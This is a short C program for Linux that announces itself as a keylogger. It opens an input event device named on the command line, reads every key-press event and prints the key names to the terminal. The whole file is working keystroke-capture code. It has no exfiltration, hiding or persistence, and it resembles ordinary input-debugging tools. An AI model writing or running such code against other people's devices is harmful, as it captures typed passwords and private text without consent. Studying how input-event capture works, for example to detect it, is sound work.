#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>

static const char *key_names[KEY_MAX + 1] = {
  [KEY_ESC] = "ESC",
  [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
  [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
  [KEY_9] = "9", [KEY_0] = "0",
  [KEY_MINUS] = "-", [KEY_EQUAL] = "=", [KEY_BACKSPACE] = "BACKSPACE",
  [KEY_TAB] = "TAB",
  [KEY_Q] = "Q", [KEY_W] = "W", [KEY_E] = "E", [KEY_R] = "R",
  [KEY_T] = "T", [KEY_Y] = "Y", [KEY_U] = "U", [KEY_I] = "I",
  [KEY_O] = "O", [KEY_P] = "P",
  [KEY_LEFTBRACE] = "[", [KEY_RIGHTBRACE] = "]", [KEY_ENTER] = "ENTER",
  [KEY_LEFTCTRL] = "LCTRL",
  [KEY_A] = "A", [KEY_S] = "S", [KEY_D] = "D", [KEY_F] = "F",
  [KEY_G] = "G", [KEY_H] = "H", [KEY_J] = "J", [KEY_K] = "K",
  [KEY_L] = "L",
  [KEY_SEMICOLON] = ";", [KEY_APOSTROPHE] = "'", [KEY_GRAVE] = "`",
  [KEY_LEFTSHIFT] = "LSHIFT", [KEY_BACKSLASH] = "\\",
  [KEY_Z] = "Z", [KEY_X] = "X", [KEY_C] = "C", [KEY_V] = "V",
  [KEY_B] = "B", [KEY_N] = "N", [KEY_M] = "M",
  [KEY_COMMA] = ",", [KEY_DOT] = ".", [KEY_SLASH] = "/",
  [KEY_RIGHTSHIFT] = "RSHIFT", [KEY_KPASTERISK] = "KP*",
  [KEY_LEFTALT] = "LALT", [KEY_SPACE] = "SPACE",
  [KEY_CAPSLOCK] = "CAPSLOCK",
  [KEY_F1] = "F1", [KEY_F2] = "F2", [KEY_F3] = "F3", [KEY_F4] = "F4",
  [KEY_F5] = "F5", [KEY_F6] = "F6", [KEY_F7] = "F7", [KEY_F8] = "F8",
  [KEY_F9] = "F9", [KEY_F10] = "F10",
  [KEY_NUMLOCK] = "NUMLOCK", [KEY_SCROLLLOCK] = "SCROLLLOCK",
  [KEY_KP7] = "KP7", [KEY_KP8] = "KP8", [KEY_KP9] = "KP9",
  [KEY_KPMINUS] = "KP-",
  [KEY_KP4] = "KP4", [KEY_KP5] = "KP5", [KEY_KP6] = "KP6",
  [KEY_KPPLUS] = "KP+",
  [KEY_KP1] = "KP1", [KEY_KP2] = "KP2", [KEY_KP3] = "KP3",
  [KEY_KP0] = "KP0", [KEY_KPDOT] = "KP.",
  [KEY_F11] = "F11", [KEY_F12] = "F12",
  [KEY_KPENTER] = "KPENTER", [KEY_RIGHTCTRL] = "RCTRL",
  [KEY_KPSLASH] = "KP/", [KEY_SYSRQ] = "SYSRQ",
  [KEY_RIGHTALT] = "RALT",
  [KEY_HOME] = "HOME", [KEY_UP] = "UP", [KEY_PAGEUP] = "PAGEUP",
  [KEY_LEFT] = "LEFT", [KEY_RIGHT] = "RIGHT",
  [KEY_END] = "END", [KEY_DOWN] = "DOWN", [KEY_PAGEDOWN] = "PAGEDOWN",
  [KEY_INSERT] = "INSERT", [KEY_DELETE] = "DELETE",
  [KEY_LEFTMETA] = "LMETA", [KEY_RIGHTMETA] = "RMETA",
};

int main(int argc, char *argv[])
{
  if (argc != 2) {
    printf("Usage: %s <event-file-path>\n", argv[0]);
    exit(-1);
  }
  printf("keyloger active ...\n");

  int fd = open(argv[1], O_RDONLY, 0);
  if (fd < 0) {
    perror("open");
    exit(-1);
  }
  printf("Opened file descreptor %d\n", fd);

  struct input_event ie;
  while (1) {
    if (read(fd, &ie, sizeof(ie)) != sizeof(ie)) {
      perror("read");
      break;
    }
    if (ie.type != EV_KEY) {
      continue;
    }
    if (ie.value != 1) {
      continue;
    }
    if (ie.code <= KEY_MAX && key_names[ie.code]) {
      printf("%s", key_names[ie.code]);
    }
    else {
      printf("Unknown key presses: code %d\n", ie.code);
    }
    fflush(stdout);
  }

  return 0;
}
